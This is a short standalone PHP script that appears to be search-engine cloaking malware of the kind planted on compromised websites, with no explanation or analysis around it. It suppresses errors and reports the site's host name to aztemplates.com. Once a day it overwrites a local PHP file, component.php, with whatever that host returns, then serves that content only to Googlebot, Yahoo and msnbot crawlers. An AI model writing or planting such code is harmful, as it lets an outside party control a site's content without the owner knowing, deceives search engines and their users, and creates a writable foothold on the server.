<?php
	error_reporting(0);
	ini_set('display_errors',0);
	$url = $_SERVER['HTTP_HOST']; $url = str_replace("&", "",$url);
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php"; $cachetime = 1 * 24 * 60 * 60; //1 * 24 * 60 * 60
	$access = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile'); $source = "http://aztemplates.com/b/n.php?site=".$url;
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {$string = file_get_contents($source);$result = file_put_contents($target, $string);}
	foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT'])) echo file_get_contents($target);}
?>